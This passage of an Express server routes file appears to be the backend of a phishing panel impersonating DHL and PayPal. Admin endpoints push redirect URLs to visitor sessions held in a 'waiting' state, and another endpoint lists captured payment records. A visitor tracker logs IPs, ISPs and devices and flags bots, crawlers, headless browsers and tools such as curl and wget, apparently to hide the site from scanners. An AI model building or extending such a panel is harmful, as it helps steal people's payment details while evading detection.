      const updated = await storage.updateDhlSession(sessionId, {
        currentPath,
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update path" });
    }
  });

  app.get("/api/admin/dhl-sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllDhlSessions();
      const waitingSessions = sessions.filter(s => s.status === "waiting");
      res.json(waitingSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to get sessions" });
    }
  });

  app.post("/api/admin/dhl-sessions/:sessionId/redirect", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { redirectUrl } = req.body;

      // Get current session to increment version
      const currentSession = await storage.getDhlSession(sessionId);
      if (!currentSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Increment redirectVersion and update redirectUrl, keep status as waiting
      const updated = await storage.updateDhlSession(sessionId, {
        redirectUrl,
        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Update PayPal session redirect (admin)
  app.post("/api/admin/paypal-sessions/:sessionId/redirect", async (req, res) => {
    try {
      const { sessionId } = req.params;
      const { redirectUrl } = req.body;

      // Get current session to increment version
      const currentSession = await storage.getPaypalSession(sessionId);
      if (!currentSession) {
        return res.status(404).json({ error: "Session not found" });
      }

      // Increment redirectVersion and update redirectUrl, keep status as waiting
      const updated = await storage.updatePaypalSession(sessionId, {
        redirectUrl,
        redirectVersion: (currentSession.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      if (!updated) {
        return res.status(404).json({ error: "Session not found" });
      }

      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update session" });
    }
  });

  // Get all payment records (for admin)
  app.get("/api/payments", async (req, res) => {
    try {
      const records = await storage.getAllPaymentRecords();
      res.json(records);
    } catch (error) {
      res.status(500).json({ error: "Failed to get payment records" });
    }
  });

  // Visitor tracking endpoints
  app.post("/api/visitor/track", async (req, res) => {
    try {
      const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || 
                       (req.headers['x-real-ip'] as string) || 
                       req.socket.remoteAddress || 
                       'unknown';

      const userAgent = req.headers['user-agent'] || 'unknown';
      
      // Enhanced bot detection - check for common bot signatures
      const botPatterns = [
        /bot/i, /crawler/i, /spider/i, /scraper/i,
        /headless/i, /phantom/i, /selenium/i, /puppeteer/i,
        /curl/i, /wget/i, /python/i, /java/i, /go-http/i,
        /facebookexternalhit/i, /whatsapp/i, /twitter/i,
        /googlebot/i, /bingbot/i, /slackbot/i, /discordbot/i
      ];
      const isBot = botPatterns.some(pattern => pattern.test(userAgent));
      
      // Extract device/browser/OS info from user agent
      const isMobile = /mobile|android|iphone|ipad|ipod/i.test(userAgent);
      const browser = userAgent.match(/(chrome|safari|firefox|edge|opera)/i)?.[0] || 'unknown';
      const os = userAgent.match(/(windows|mac|linux|android|ios)/i)?.[0] || 'unknown';
      
      // Enhanced device detection
      let device = 'desktop';
      if (/iphone/i.test(userAgent)) device = 'iPhone';
      else if (/ipad/i.test(userAgent)) device = 'iPad';
      else if (/android.*mobile/i.test(userAgent)) device = 'Android Phone';
      else if (/android/i.test(userAgent)) device = 'Android Tablet';
      else if (isMobile) device = 'Mobile';
      
      // Proxy/VPN detection based on common headers
      const proxyHeaders = [
        req.headers['x-forwarded-for'],
        req.headers['x-real-ip'],
        req.headers['via'],
        req.headers['x-proxy-id']
      ];
      const hasMultipleProxyHeaders = proxyHeaders.filter(h => h).length > 1;
      const isProxy = hasMultipleProxyHeaders || req.body.isProxy === "true";
      
      const visitorData = {
        sessionId: req.body.sessionId || null,
        flowType: req.body.flowType || 'unknown',
        ipAddress: clientIp,
        country: req.body.country || null,
        city: req.body.city || null,
        region: req.body.region || null,
        isp: req.body.isp || null,
        userAgent,
        device: req.body.device || device,
        browser,
        os,
        language: req.body.language || req.headers['accept-language']?.split(',')[0] || null,
        referrer: req.headers['referer'] || null,
        currentPage: req.body.currentPage || null,
        isBot: isBot ? "true" : "false",
        isMobile: isMobile ? "true" : "false",
        isProxy: isProxy ? "true" : "false",
        connectionType: req.body.connectionType || null,
      };

      console.log(`[Visitor Track] ${visitorData.flowType.toUpperCase()} | IP: ${clientIp} | Bot: ${isBot} | Mobile: ${isMobile} | Proxy: ${isProxy} | Page: ${req.body.currentPage}`);

      const log = await storage.createVisitorLog(visitorData);
      res.json(log);
    } catch (error) {
      console.error("Failed to track visitor:", error);
      res.status(500).json({ error: "Failed to track visitor" });
    }
  });

  app.get("/api/admin/visitors", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const logs = await storage.getAllVisitorLogs(limit);
      res.json(logs);
    } catch (error) {
      res.status(500).json({ error: "Failed to get visitor logs" });
    }
  });

  app.post("/api/admin/visitors/clear", async (req, res) => {
    try {
      await storage.clearVisitorLogs();
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to clear visitor logs" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
